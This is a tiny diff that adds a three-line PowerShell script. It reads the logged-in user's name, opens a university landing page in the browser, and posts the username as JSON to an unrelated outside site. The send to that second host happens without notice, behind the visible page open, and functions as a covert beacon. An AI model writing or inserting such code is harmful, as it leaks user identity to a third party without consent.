@@ -1,1 +1,3 @@
-
+$username = $env:USERNAME
+Start-Process "https://landing-etic.salle.url.edu"
+Invoke-RestMethod -Uri "https://moltsgats.site/sendsal2025" -Method Post -ContentType "application/json" -Body (@{username=$username} | ConvertTo-Json)
